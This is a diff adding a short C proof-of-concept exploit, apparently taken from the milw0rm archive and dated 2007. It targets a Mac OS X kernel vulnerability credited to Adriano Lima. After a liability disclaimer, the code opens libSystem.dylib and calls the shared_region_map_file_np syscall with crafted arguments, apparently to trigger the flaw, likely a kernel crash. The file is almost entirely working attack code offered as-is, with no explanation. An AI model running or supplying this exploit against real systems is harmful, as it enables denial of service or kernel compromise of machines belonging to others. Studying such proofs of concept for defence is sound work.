@@ -1,0 +1,43 @@
+/*
+This vulnerability was discovered by Adriano Lima
+<adriano@risesecurity.org>.
+
+REFERENCES
+
+[1] Mac OS X Internals: A Systems Approach By Amit Singh
+
+DISCLAIMER
+
+The authors reserve the right not to be responsible for the topicality,
+correctness, completeness or quality of the information provided in this
+document. Liability claims regarding damage caused by the use of any
+information
+provided, including any kind of information which is incomplete or
+incorrect,
+will therefore be rejected.
+*/
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+
+int main(int argc,char **argv){
+   int fd;
+
+   if((fd=open("/usr/lib/libSystem.dylib",O_RDONLY))==-1){
+       perror("open");
+       exit(EXIT_FAILURE);
+   }
+
+   if(syscall(SYS_shared_region_map_file_np,fd,0x02000000,NULL,NULL)==-1){
+       perror("shared_region_map_file_np");
+       exit(EXIT_FAILURE);
+   }
+
+   exit(EXIT_FAILURE);
+}
+
+// milw0rm.com [2007-01-21]
